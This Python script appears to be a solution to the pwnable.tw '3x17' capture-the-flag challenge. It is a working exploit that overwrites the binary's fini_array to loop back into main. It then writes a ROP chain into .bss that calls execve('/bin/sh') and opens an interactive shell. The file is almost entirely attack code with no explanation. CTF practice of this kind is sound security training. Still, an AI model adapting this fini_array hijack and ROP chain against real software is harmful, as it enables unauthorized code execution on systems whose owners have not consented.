from pwn import *
context.log_level = "debug"

r = process("./3x17")
#r = remote("chall.pwnable.tw", 10105)

#print r.pid
#pause()

def edit(addr, data):
    r.sendlineafter("addr:", str(addr))
    r.sendafter("data:", data)

p_rax = 0x000000000041e4af
p_rdi = 0x0000000000401696
p_rsi = 0x0000000000406c30
p_rdx = 0x0000000000446e35
leave = 0x0000000000401C4B
syscall = 0x4022b4
fini = 0x4b40f0
main = 0x401b6d
bss = 0x4b4100

edit(fini, p64(0x402960) + p64(main))
edit(bss, p64(p_rax) + p64(0x3b))
edit(bss+0x10, p64(p_rdi) + p64(bss+0x48))
edit(bss+0x20, p64(p_rsi) + p64(0))
edit(bss+0x30, p64(p_rdx) + p64(0))
edit(bss+0x40, p64(syscall) + "/bin/sh\x00")

edit(fini, p64(leave))

r.interactive()
